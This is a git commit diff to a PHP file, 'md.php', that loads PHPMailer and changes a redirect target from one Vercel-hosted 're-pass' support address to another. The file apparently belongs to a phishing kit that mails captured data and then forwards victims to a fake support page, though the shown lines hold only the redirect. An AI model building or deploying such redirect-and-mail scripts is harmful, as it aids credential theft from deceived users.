6fa11800e637a49d6f4d13ccaa8ca47a28a510a6
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-15 21:47:18 +0500

    Update md.php

--- md.php
+++ md.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-pass-support.vercel.app/");
+header("Location: https://re-pass-aprove-section.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
